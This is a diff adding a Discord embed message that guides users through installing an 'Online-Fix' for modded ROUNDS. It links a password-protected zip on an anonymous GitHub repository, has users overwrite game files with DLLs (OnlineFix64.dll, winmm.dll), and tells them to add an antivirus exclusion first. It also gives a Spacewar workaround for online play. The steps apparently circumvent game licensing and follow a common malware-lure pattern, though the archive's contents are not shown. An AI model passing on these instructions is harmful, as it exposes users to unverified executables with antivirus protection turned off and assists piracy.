@@ -1,0 +1,39 @@
+{
+  "embeds": [
+    {
+      "description": "# 🟠 MODDED ROUNDS — ONLINE SETUP\n\n**Modded 1.1.1 profile · Online-Fix · `old-rounds-for-mods` build**\n\n> Play modded ROUNDS online with the crew — everyone runs the **same profile**, so lobbies don't desync.\n\n> 📦 **Profile:** `01a0de2c-2f18-9acf-b8e3-6e19cd50cfcb` · *Modded 1.1.1*\n> 🔑 **Zip password:** `online-fix.me`\n> 🎯 **Build:** `old-rounds-for-mods`\n\n-# ─────────────────────────────────\n## 1️⃣ Get the Right Build\nROUNDS must be on the **`old-rounds-for-mods`** depot — the current build breaks most mods.\n-# Own it on Steam? Library → right-click **ROUNDS** → **Properties → Betas** → pick `old-rounds-for-mods`.\n\n-# ─────────────────────────────────\n## 2️⃣ Install the Online-Fix\n1. Download → **[📥 ROUNDS-Fix-Repair.zip](https://raw.githubusercontent.com/XevioQwerty/discord-direct/main/downloads/online-fix/ROUNDS-Fix-Repair-6707853.zip)** *(10 MB)*\n2. Open the game folder: Steam → right-click **ROUNDS** → **Manage → Browse local files**.\n3. Extract **everything** from the zip into that folder → **overwrite** when asked. Password:\n```\nonline-fix.me\n```\n-# Antivirus may flag `OnlineFix64.dll` / `winmm.dll` — add an exclusion for the ROUNDS folder first.\n\n-# ─────────────────────────────────\n## 3️⃣ Import the Mod Profile\n1. Install **[r2modman](https://github.com/ebkr/r2modmanPlus/releases/latest)** and select **ROUNDS**.\n2. **Import / Update → Import new profile → From code**, then paste:\n```\n01a0de2c-2f18-9acf-b8e3-6e19cd50cfcb\n```\n3. Name it **Modded 1.1.1** and let every mod finish downloading.\n\n-# ─────────────────────────────────\n## 4️⃣ Play\nKeep **Steam open**, then hit **Start modded** in r2modman. Invite friends through the Steam overlay (`Shift + Tab`).\n\n-# ─────────────────────────────────\n## 🛠️ Troubleshooting\n- **Invites / lobbies not working?** Install Spacewar: press `Win + R` and paste `steam://install/480`\n- **Mods not loading?** Launch with **Start modded** in r2modman, not from Steam.\n- **Desyncs or missing cards?** Everyone must be on the **same profile code** — re-import if it changes.",
+      "color": 15965202,
+      "thumbnail": {
+        "url": "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/1557740/header.jpg?t=1759328419"
+      },
+      "footer": {
+        "text": "Profile: Modded 1.1.1 • Online-Fix for old-rounds-for-mods"
+      }
+    }
+  ],
+  "components": [
+    {
+      "type": 1,
+      "components": [
+        {
+          "type": 2,
+          "style": 5,
+          "label": "📥 Download Online-Fix",
+          "url": "https://raw.githubusercontent.com/XevioQwerty/discord-direct/main/downloads/online-fix/ROUNDS-Fix-Repair-6707853.zip"
+        },
+        {
+          "type": 2,
+          "style": 5,
+          "label": "🧩 Get r2modman",
+          "url": "https://github.com/ebkr/r2modmanPlus/releases/latest"
+        },
+        {
+          "type": 2,
+          "style": 5,
+          "label": "📦 ROUNDS Mods",
+          "url": "https://thunderstore.io/c/rounds/"
+        }
+      ]
+    }
+  ]
+}
